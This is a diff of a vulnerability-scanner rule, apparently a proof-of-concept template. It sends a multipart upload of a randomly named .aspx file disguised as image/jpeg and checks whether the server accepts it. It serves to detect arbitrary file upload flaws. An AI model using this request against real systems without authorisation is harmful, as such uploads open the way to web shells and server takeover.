@@ -14,13 +14,14 @@ rules:
             headers:
                 Content-Disposition: form-data;name="file1";filename="{{randname}}.aspx";
                 Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
-            body: |-
-                -----------------------------20873900192357278038549710136
-                Content-Disposition: form-data; name="file1"; filename="{{randname}}.aspx"
-                Content-Type: image/jpeg
-
-                {{content}}
-                -----------------------------20873900192357278038549710136--
+            body: "\
+                -----------------------------20873900192357278038549710136\r\n\
+                Content-Disposition: form-data; name=\"file1\"; filename=\"{{randname}}.aspx\"\r\n\
+                Content-Type: image/jpeg\r\n\
+                \r\n\
+                {{content}}\r\n\
+                -----------------------------20873900192357278038549710136--\r\n\
+                "
             follow_redirects: false
         expression: response.status == 200 && response.body.bcontains(b".ASPX")
         output:
